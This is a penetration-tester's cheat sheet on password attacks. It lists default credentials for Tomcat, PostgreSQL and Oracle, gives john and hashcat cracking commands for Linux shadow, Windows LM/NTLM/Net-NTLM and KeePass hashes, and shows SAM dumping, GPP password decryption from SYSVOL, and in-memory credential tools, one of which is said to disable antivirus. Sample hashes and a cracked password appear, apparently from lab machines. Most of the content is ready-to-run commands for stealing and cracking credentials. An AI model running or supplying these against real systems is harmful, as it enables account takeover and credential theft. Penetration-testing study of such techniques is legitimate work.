# Default credentials


## password lists

    Convert 
    tr '[:upper:]' '[:lower:]' <enum/site_words.txt >enum/site_words_lower.txt


Kali Dictionaries
- /usr/share/john/password.lst
- /usr/share/dirb/wordlists/big.txt
- /usr/share/wfuzz/wordlist/general/big.txt
- /usr/share/wordlists/rockyou.txt             (unzip it before use)
- /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt



## Listes
SecLists: wget https://github.com/danielmiessler/SecLists/archive/master.zip


## ftp default passwd

````
USER anonymous
````


## Apache Tomcat Default Credentials

|Username     |Password  |
|-------------|----------|
|admin        |password  |
|admin        |<blank>   |
|admin        |Password1 |
|admin        |password1 |
|admin        |admin     |
|admin        |tomcat    |
|both         |tomcat    |
|manager      |manager   |
|role1        |role1     |
|role1        |tomcat    |
|role         |changethis|
|root         |Password1 |
|root         |changethis|
|root         |password  |
|root         |password1 |
|root         |r00t      |
|root         |root      |
|root         |toor      |
|tomcat       |tomcat    |
|tomcat       |s3cret    |
|tomcat       |password1 |
|tomcat       |password  |
|tomcat       |<blank>   |
|tomcat       |admin     |
|tomcat       |changethis|

## PostgreSQL

|Username     |Password     |
|-------------|-------------|
|postgres     |postgres     |
|postgres     |password     |
|postgres     |admin        |
|admin        |admin        |
|admin        |password     |


## Oracle

|  Username   |   Password      |
|-------------|-----------------|
|SYSTEM       |MANAGER          |
|SCOTT        |TIGER            |
|SYS          |CHANGE_ON_INSTALL|
|OUTLN        |OUTLN            |
|DBSNMP       |DBSNMP           |
|CTXSYS       |CTXSYS           |
|MDSYS        |MDSYS            |


## hash-identifier
    hash-identifier xxxxxx

## Unshadow /etc/passwd+/etc/shadow

    unshadow password_file shadow_file > new_password_list

## John 

    john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 password_list

    john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

## Hash Windows SAM
    LM : ex: 299BD128C1101FD6
    john --format=lm hash.txt
    hashcat -m 3000 -a 3 hash.txt

    NTLM : ex: 26112010952d963c8dc4217daec986d9
    Found from SAM: admin:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
    MD4(UTF-16-LE(password))
    john --format=nt hash.txt
    hashcat -m 1000 -a 3 hash.txt

    NTLMv1 (A.K.A. Net-NTLMv1) : ex: u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
    john --format=netntlm hash.txt
    hashcat -m 5500 -a 3 hash.txt

    NTLMv2 (A.K.A. Net-NTLMv2) : ex: admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030
    john --format=netntlmv2 hash.txt
    hashcat -m 5600 -a 3 hash.txt



## Misconfigured AD
    net use z: \\(target_hostname)\SYSVOL
    dir /s Groups.xml
    type Z:\local.domain\Policies\{84583021-C460-486C-83E1- FA1EC8CA84FC}\Machine\Preferences\Groups\Groups.xml
    gpp-decrypt SvtusBQWJgAFrFPTyPH9clizXPQBDqDDGzlSDxKogcz, password will be outputted

## SAM dump : Samdump2
```
cd /mnt/vhd/Windows/System32/config
# samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

## SAM Cracking: WCE32/WCE64
    About: wce32.exe (wce64.exe) can be used to attempt cracking of user passwords in memory
    wce32.exe -w 
    wce64.exe -w

## SAM Cracking: FGdump
    FGdump.exe can be used to crack local SAM hashes in memory. 
    The program uses the IPC$ share to connect and additionally attempts to disable antivirus that may be running on the host
    fgdump.exe, then "type 127.0.0.1.pwdump" to list found pwd

## SAM Cracking: PWdump
    About: PWdump.exe can be used to crack local SAM hashes in memory. Does not have the added bonus like FGdump of disabling antivirus. This will need to be done prior to running the program
    Usage: pwdump.exe (host)
    pwdump.exe
    pwdump.exe 127.0.0.1

## Keepass
```
     keepass2john tim.kdbx 
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
https://hashcat.net/wiki/doku.php?id=example_hashes
$keepass$*2*6000*222*f3 => 
13400 :	KeePass 2 AES / without keyfile 	$keepass$*2*6000*222*a279e37c
13400 : Keepass 2 AES / with keyfile 	$keepass$*2*6000*222*15b6

cat tim.keepass
$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da

hashcat -m 13400 tim.keepass

=> simplementeyo

```


## Online hash crackers:

### Hashkiller (Windows/NTLM):
    https://hashkiller.co.uk/ntlm-decrypter.aspx

### Crackstation (MD5):
    https://crackstation.net

### Offensive security (MD5):

    http://cracker.offensive-security.com

### RDCMan - Decrypt Microsoft Remote Desktop Manager passwords (RDCman)
    Open the .rdg file with a text editor and copy in the password section
    
    
## cyberchef : magic

https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=TlZDaWpGN242cGVNN2E3eUxZUFpyUGdIbVdVSGk5N0xDQXpYeFNFVXJhS21l
